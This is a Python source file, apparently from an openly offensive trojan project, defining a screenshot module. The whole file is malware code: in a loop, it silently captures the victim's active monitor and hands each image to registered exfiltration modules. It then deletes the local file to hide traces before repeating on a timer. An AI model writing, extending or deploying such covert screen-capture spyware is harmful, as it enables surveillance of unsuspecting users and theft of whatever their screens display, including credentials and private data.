#!/usr/bin/env python3
# https://github.com/EONRaider/bca-trojan

__author__ = 'EONRaider @ keybase.io/eonraider'

import os
import time
from pathlib import Path

from mss import mss

from src.modules.exploitation.exploitation_module import ExploitationModule


class ScreenShot(ExploitationModule):
    def __init__(self, *,
                 image_path: [str, Path],
                 exfil_time: float = None,
                 auto_remove: bool = True):
        """Take a screenshot of the currently active monitor and send
        the results to pre-configured exfiltration methods.

        Args:
            image_path: A string or instance of pathlib.Path containing
                the absolute path to the location where the screenshot
                file will be written.
            auto_remove: Automatically delete the screenshot image
                after exfiltration is complete.
        """

        super().__init__(exfil_time)
        self._image_path = Path(image_path)
        self.auto_remove = auto_remove

    @property
    def contents(self) -> Path:
        return self._image_path

    def report(self):
        raise NotImplementedError

    def _notify_all_exfiltrators(self) -> None:
        [exfiltrator.update(self.contents) for exfiltrator in
         self._exfiltrators]

    def execute(self):
        """Take a screenshot, send it as a file to all registered
        exfiltrators and optionally remove it."""
        while True:
            with mss() as screen:
                screen.shot(output=str(self._image_path))
            self._notify_all_exfiltrators()
            if self.auto_remove is True:
                os.unlink(self._image_path)
            try:
                time.sleep(self.exfil_time)
            except TypeError:
                break
